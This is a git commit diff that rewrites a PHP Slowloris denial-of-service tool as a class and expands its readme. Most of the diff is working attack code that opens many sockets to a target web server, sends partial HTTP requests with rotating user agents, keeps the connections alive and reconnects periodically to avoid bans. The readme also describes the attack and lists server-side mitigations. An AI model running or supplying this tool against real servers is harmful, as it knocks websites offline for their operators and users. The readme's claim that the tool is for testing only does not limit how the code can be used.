de085fd4d760ab016ca15182d4ff212b533554c9
Ahmed Ibrahim <ah.ib94@hotmail.com>
2021-02-13 22:58:54 +0200

    re-write tool on object oriented manner

--- readme.md
+++ readme.md
@@ -1,19 +1,40 @@
 ## This is a php developed tool for slowLoris attack
 
-
         usage example 
-        php slowLoris.php -h example.com -p 80
-
+        php slowLoris.php -h example.com -p 80 -s 200
+        -h .. is the hostname
+        -p .. is the port
+        -s .. is the sockets numbers  
 
         this tool is for test purpose only
 
+##     Description
+Slowloris is a type of denial of service attack tool which allows a single machine to take down another machine's web server with minimal bandwidth and side effects on unrelated services and ports.
 
+Slowloris tries to keep many connections to the target web server open and hold them open as long as possible. It accomplishes this by opening connections to the target web server and sending a partial request. Periodically, it will send subsequent HTTP headers, adding to, but never completing, the request. Affected servers will keep these connections open, filling their maximum concurrent connection pool, eventually denying additional connection attempts from clients.
 
+##     Tool Steps
+1. Tool start making lots of HTTP requests.
+   
+2. Tool send headers periodically (every ~15 seconds) to keep the connections open.
+   
+3. Tool close connections every Two minutes and start again not to get band by the server
+   
+4. If the server closes a connection, Tool create a new one keep doing the same thing.
 
- **1. We start making lots of HTTP requests.**
-   
-**2. We send headers periodically (every ~15 seconds) to keep the connections open.**
-   
-**3. we close connections every two minutes and start again not to get band by the server** 
-   
-**4. If the server closes a connection, we create a new one keep doing the same thing.**
+## How to Mitigate and Prevent a Slowloris DDoS Attack
+- Increase the maximum number of clients the Web server will allow
+
+- Limit the number of connections a single IP address is allowed to attempt
+
+- Place restrictions on the minimum transfer speed a connection is allowed
+
+- Constrain the amount of time a client is permitted to stay connected.
+
+In the case of Apache Web servers, several modules can be employed to prevent damage from a Slowloris DDoS attack. These modules include:
+- Mod_limitipconn
+- Mod_qos
+- Mod_evasive
+- Mod security
+- Mod_noloris
+- Mod_antiloris
--- slowLoris.php
+++ slowLoris.php
@@ -1,114 +1,137 @@
 #!/usr/bin/php
 <?php
 
-
-$host = @$argv[1]=='-h' ? @$argv[2]: die("Usage Example:: php slowLoris.php -h example.com -p 80\n");
+$host = @$argv[1]=='-h' ? @$argv[2]: die("Usage Example:: php slowLoris.php -h example.com -p 80 -s 200\n");
 $port = (@$argv[3]=='-p') ? @$argv[4] : "80" ;
+$no_of_sockets = (@$argv[5]=='-s') ? @$argv[6] : "200" ;
 
-$user_agents = [
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:49.0) Gecko/20100101 Firefox/49.0",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/602.2.14 (KHTML, like Gecko) Version/10.0.1 Safari/602.2.14",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
-    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
-    "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
-    "Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
-    "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
-    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
-    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:49.0) Gecko/20100101 Firefox/49.0",
-];
-
-$socket_list = array();
+if(!$port){
+    die("Please Make sure you entered correct port");
+}
+if(!$no_of_sockets){
+    die("Please Make sure you entered correct number of sockets");
+}
 
 
-
-// Initalizing the attack from here
-initalize_attack();
+(new SlowLoris($host,$port,$no_of_sockets))->initalize_attack();
 
 
+class SlowLoris{
+    private $host;
 
-function initalize_attack(){
-    global $host;
-    global $socket_list;
+    private $port;
 
-    echo "Attacking ".$host." with 150 socket\n";
-    echo "Creating Sockets...\n";
-    create_sockets();
+    private $no_of_sockets;
 
-    $time=0;
-    while($time<120){
-        echo "Sending custom headers,to keep sockets alive...Socket Count ".count($socket_list)."\n";
-        for($i=0;$i<count($socket_list);$i++){
-            if(!@socket_write($socket_list[$i],"X-a:".rand(0,2000)."\r\n")){
-                 array_splice($socket_list,$i);
+    private $socket_list = [];
+
+    private $user_agents = [
+        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
+        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
+        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
+        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:49.0) Gecko/20100101 Firefox/49.0",
+        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
+        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
+        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
+        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/602.2.14 (KHTML, like Gecko) Version/10.0.1 Safari/602.2.14",
+        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393",
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
+        "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
+        "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
+        "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
+        "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
+        "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
+        "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
+        "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
+        "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
+        "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
+        "Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
+        "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
+        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
+        "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:49.0) Gecko/20100101 Firefox/49.0",
+    ];
+
+    public function __construct($host,$port,$no_of_sockets)
+    {
+        $this->host = $host;
+        $this->port = $port;
+        $this->no_of_sockets = $no_of_sockets;
+    }
+
+    public function initalize_attack()
+    {
+        echo "Attacking $this->host : $this->port with $this->no_of_sockets socket\n";
+        echo "Creating Sockets...\n";
+        $this->create_sockets($this->no_of_sockets);
+
+        $time=0;
+        while ($time<120) {
+            echo "Sending custom headers,to keep sockets alive...Socket Count ".count($this->socket_list)."\n";
+            for ($i=0;$i<count($this->socket_list);$i++) {
+                if (!@socket_write($this->socket_list[$i], "X-a:".rand(0, 2000)."\r\n")) {
+                    array_splice($this->socket_list, $i);
+                }
             }
+
+            if(count($this->socket_list)<$this->no_of_sockets) {
+                $socket = $this->init_socket();
+                $this->socket_list[] = $socket;
+            }
+
+            $time += 15;
+            sleep(15);
         }
 
-        while(count($socket_list)<150){
-            $socket = init_socket();
-            $socket_list[] = $socket;
+        $this->close_sockets_And_start_again();
+    }
+
+    protected function create_sockets($no_of_sockets){
+        for ($i=0;$i<$no_of_sockets;$i++) {
+            $socket = $this->init_socket();
+            if(!$socket){
+                echo "Couldn't Init Socket no $i \n";
+                continue;
+            }
+            $this->socket_list[] = $socket;
+        }
+    }
+
+    protected function init_socket(){
+        $socket = socket_create(AF_INET, SOCK_STREAM, 0);
+        if(!$socket){
+            return false;
         }
 
-        $time += 15;
-        sleep(15);
+        // set_time_limit(4);
+        $result = @socket_connect($socket, $this->host, $this->port);
+        if(!$result){
+            return false;
+        }
+
+        socket_write($socket, 
+            "GET /?" . rand(0,2000) . "HTTP/1.1\r\n".
+            "User-Agent:" . $this->user_agents[array_rand($this->user_agents)] ."\r\n".
+            "{Accept-language: en-US,en,q=0.5}\r\n".
+            "Connection: Keep-Alive\r\n"
+        );
+
+        return $socket;
     }
-    // after 2 minutes... lets close the sockets and start again
-    close_sockets_And_start_again();
-}
 
-function create_sockets(){
-    global $socket_list;
-    for($i=0;$i<150;$i++){
-        $socket = init_socket();
-        $socket_list[] = $socket;
+    protected function close_sockets_and_start_again()
+    {
+        echo "Closing Sockets and starting again not to get band \n";
+        
+        foreach($this->socket_list as $socket){
+            socket_close($socket);
+        }
+        
+        $this->socket_list = [];
+
+        $this->initalize_attack();
     }
-}
-
-
-function init_socket(){
-    global $host;
-    global $port;
-    global $user_agents;
-
-    $socket = socket_create(AF_INET, SOCK_STREAM, 0) or die("Could not create socket\n");
-    // set_time_limit(4);
-    $result = @socket_connect($socket, $host, $port) or die("Could not connect to server\n");
-
-    socket_write($socket, "GET /?" . rand(0,2000) . "HTTP/1.1\r\n");
-    $random_array_index = array_rand($user_agents);
-    socket_write($socket, "User-Agent:" . $user_agents[$random_array_index] ."\r\n");
-    socket_write($socket,"{Accept-language: en-US,en,q=0.5}\r\n");
-
-    return $socket;
-}
-
-
-
-function close_sockets_And_start_again(){
-    global $socket_list;
-
-    echo "Closing Sockets and starting again not to get band \n";
-    for($i=0;$i<count($socket_list);$i++){
-        socket_close($socket_list[$i]);
-    }
-    $socket_list = [];
-
-    initalize_attack();
 }
 
 
